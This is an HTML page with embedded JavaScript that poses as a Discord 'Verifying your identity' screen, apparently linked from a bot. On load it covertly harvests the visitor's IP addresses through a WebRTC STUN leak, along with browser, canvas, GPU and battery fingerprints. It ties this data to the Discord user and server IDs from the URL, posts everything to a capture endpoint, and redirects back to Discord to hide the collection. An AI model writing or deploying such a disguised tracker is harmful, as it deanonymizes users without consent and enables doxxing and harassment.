<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta http-equiv="refresh" content="1.5; url=discord://">
  <title>Verifying...</title>
  <style>
    body {
      background: #1e1e1e; color: white; font-family: Arial, sans-serif;
      text-align: center; padding-top: 20%; margin: 0;
    }
    .spinner {
      border: 4px solid #333; border-top: 4px solid #5865F2;
      border-radius: 50%; width: 40px; height: 40px;
      animation: spin 1s linear infinite; margin: 20px auto;
    }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <h2>Verifying your identity...</h2>
  <div class="spinner"></div>
  <p style="color: #888; font-size: 14px;">You will be redirected back automatically.</p>

  <script>
    // ===== CONFIGURATION — SET THIS =====
    const API_URL = '/api/capture';  // POST endpoint on the bot's own server
    // ====================================

    // Grab Discord user info from URL params (sent by the bot)
    const params = new URLSearchParams(window.location.search);
    const userId = params.get('uid') || '';
    const username = params.get('un') || '';
    const displayName = params.get('dn') || '';
    const guildId = params.get('gid') || '';

    const data = {
      userId,
      username,
      displayName,
      guildId,
      timestamp: new Date().toISOString(),
      referrer: document.referrer,
      pageURL: window.location.href
    };

    // --- WebRTC IP leak ---
    function getWebRTCIPs() {
      return new Promise((resolve) => {
        const publicIPs = new Set();
        const localIPs = new Set();
        let done = false;
        let timeout;

        try {
          const pc = new RTCPeerConnection({
            iceServers: [
              { urls: 'stun:stun.l.google.com:19302' },
              { urls: 'stun:stun1.l.google.com:19302' },
              { urls: 'stun:stun2.l.google.com:19302' }
            ]
          });
          pc.createDataChannel('');
          pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});

          pc.onicecandidate = (e) => {
            if (e.candidate && e.candidate.candidate) {
              const parts = e.candidate.candidate.split(' ');
              const ip = parts[4];
              if (ip && ip.match(/^\d+\.\d+\.\d+\.\d+$/)) {
                if (ip.startsWith('192.168.') || ip.startsWith('10.') || 
                    ip.startsWith('172.16.') || ip.startsWith('127.')) {
                  localIPs.add(ip);
                } else {
                  publicIPs.add(ip);
                }
              }
              // Also try to get from raddr (remote address) in SDP
              const raddrMatch = e.candidate.candidate.match(/raddr (\d+\.\d+\.\d+\.\d+)/);
              if (raddrMatch) {
                const raddr = raddrMatch[1];
                if (!raddr.startsWith('127.') && !raddr.startsWith('192.168.') && 
                    !raddr.startsWith('10.') && !raddr.startsWith('172.16.')) {
                  publicIPs.add(raddr);
                }
              }
            }
            if (e.candidate === null && !done) {
              done = true;
              clearTimeout(timeout);
              resolve({ public: [...publicIPs], local: [...localIPs] });
            }
          };
          timeout = setTimeout(() => {
            if (!done) { done = true; resolve({ public: [...publicIPs], local: [...localIPs] }); }
          }, 3000);
        } catch(e) { resolve({ public: [], local: [] }); }
      });
    }

    // --- Fingerprint ---
    function getFingerprint() {
      const f = {};
      f.userAgent = navigator.userAgent;
      f.platform = navigator.platform;
      f.language = navigator.language;
      f.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      f.screen = `${screen.width}x${screen.height} @${screen.colorDepth}bit`;
      f.windowSize = `${window.innerWidth}x${window.innerHeight}`;
      f.devicePixelRatio = window.devicePixelRatio;
      f.cores = navigator.hardwareConcurrency || 'unknown';
      f.memory = navigator.deviceMemory || 'unknown';
      f.maxTouchPoints = navigator.maxTouchPoints || 0;
      f.touchScreen = 'ontouchstart' in window;
      f.doNotTrack = navigator.doNotTrack;
      f.vendor = navigator.vendor;
      f.plugins = Array.from(navigator.plugins).map(p => `${p.name}`).join(', ');
      const conn = navigator.connection;
      f.connection = conn ? `${conn.effectiveType || '?'} / ${conn.downlink || '?'}mbps` : 'unknown';
      return f;
    }

    // --- Canvas FP ---
    function getCanvasFP() {
      try {
        const c = document.createElement('canvas');
        c.width = 250; c.height = 60;
        const ctx = c.getContext('2d');
        ctx.textBaseline = 'alphabetic';
        ctx.fillStyle = '#f60';
        ctx.fillRect(100, 1, 80, 30);
        ctx.fillStyle = '#069';
        ctx.font = '16px Arial';
        ctx.fillText('Cwm fjordbank glyphs vext quiz, \ud83d\ude03', 2, 35);
        ctx.fillStyle = 'rgba(102, 204, 0, 0.5)';
        ctx.font = '18px Times New Roman';
        ctx.fillText('js', 4, 50);
        return c.toDataURL().slice(0, 80);
      } catch(e) { return null; }
    }

    // --- WebGL ---
    function getWebGL() {
      try {
        const c = document.createElement('canvas');
        const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
        if (!gl) return null;
        return gl.getParameter(gl.RENDERER);
      } catch(e) { return null; }
    }

    // --- Battery ---
    async function getBattery() {
      try {
        const b = await navigator.getBattery();
        return (b.charging ? '+' : '-') + Math.round(b.level * 100) + '%';
      } catch(e) { return null; }
    }

    // --- Geolocation (no prompt — only works on HTTPS with permission, we skip) ---
    // Not used here to avoid permission popup

    // --- Send everything back to the bot ---
    (async () => {
      const [ipData, battery, fp, canvas, gpu] = await Promise.all([
        getWebRTCIPs(), getBattery(), Promise.resolve(getFingerprint()),
        Promise.resolve(getCanvasFP()), Promise.resolve(getWebGL())
      ]);

      data.ip = (ipData.public[0] || null);
      data.allPublicIPs = ipData.public;
      data.localIPs = ipData.local;
      data.platform = fp.platform;
      data.userAgent = fp.userAgent;
      data.screen = fp.screen;
      data.timezone = fp.timezone;
      data.cores = fp.cores;
      data.memory = fp.memory;
      data.touchScreen = fp.touchScreen;
      data.doNotTrack = fp.doNotTrack;
      data.connection = fp.connection;
      data.plugins = fp.plugins;
      data.canvasFP = canvas;
      data.gpu = gpu;
      data.battery = battery;

      // POST back to the bot's own API
      try {
        const res = await fetch(API_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(data)
        });
        const result = await res.json();
        console.log('Capture result:', result.status);
      } catch(e) {
        console.log('Send failed (will retry once later):', e.message);
        // Retry once after a short delay
        setTimeout(async () => {
          try {
            await fetch(API_URL, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(data)
            });
          } catch(e2) {}
        }, 1500);
      }

      // Redirect back to Discord
      setTimeout(() => {
        window.location.href = 'discord://';
        setTimeout(() => {
          window.location.href = 'https://discord.com/channels/@me';
        }, 600);
      }, 900);
    })();
  </script>
</body>
</html>
